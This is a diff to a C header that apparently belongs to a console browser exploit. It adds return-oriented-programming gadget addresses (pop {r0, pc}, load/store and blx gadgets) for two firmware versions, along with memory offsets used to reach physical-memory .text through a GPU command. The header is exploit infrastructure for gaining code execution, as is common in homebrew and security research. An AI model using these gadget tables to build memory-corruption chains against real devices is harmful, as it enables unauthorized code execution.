@@ -8,6 +8,12 @@
 #define STACKPIVOT_ADR 0x0012a4f4 //This stack-pivot gadget also exists in spider.
 #define POP_PC 0x0010b930
 #define POP_R0R4SLIPPC 0x001ca5b4 //pop {r0, r1, r2, r3, r4, sl, ip, pc}
+#define POP_R0PC 0x001bb47c //"pop {r0, pc}"
+
+#define ROP_LDRR1R1_STRR1R0 0x0066e23c //"ldr r1, [r1]" "str r1, [r0]" "bx lr"
+#define ROP_MOVR1R3_BXIP 0x00769aa0 //"mov r1, r3" "bx ip"
+#define ROP_LDRR2R0_SUBR1R2R1_STRR1R0 0x00602404 //"ldr r2, [r0]" "sub r1, r2, r1" "str r1, [r0]" "bx lr"
+#define ROP_LDRR1R5_MOVR0R8_BLXR7 0x00b158e4 //"ldr r1, [r5]" "mov r0, r8" "blx r7"
 
 #define MEMCPY 0x0016e350
 
@@ -40,6 +46,12 @@
 #define STACKPIVOT_ADR 0x0012dfd0
 #define POP_PC 0x0010dbf4
 #define POP_R0R4SLIPPC 0x001d63b4
+#define POP_R0PC 0x001c721c
+
+#define ROP_LDRR1R1_STRR1R0 0x0035309c
+#define ROP_MOVR1R3_BXIP 0x0057c59c
+#define ROP_LDRR2R0_SUBR1R2R1_STRR1R0 0x005dfb54
+#define ROP_LDRR1R5_MOVR0R8_BLXR7 0x00a782fc
 
 #define MEMCPY 0x00174e34
 
@@ -65,7 +77,9 @@
 
 #define TMPBUF_ADR 0x33F50000
 
-#define TEXT_FCRAMOFFSET 0x04500000
+#define GXLOWCMD4_DSTADR_PTR TMPBUF_ADR+0x6000 //The value stored here is the dst-addr for gxlowcmd4.
+//#define TEXT_FCRAMOFFSET 0x04500000
+#define TEXT_APPMEM_OFFSET 0x00b00000 //Offset for physical-mem .text, relative to application mem-region end.
 
 #define BEACONDATA_ADR TMPBUF_ADR+0x4000 //ADDITIONALDATA_ADR+0xb8
 #define BEACONTAGDATA_OUITYPE80_OFFSET (0xc + 0x1c + 0x1bc)
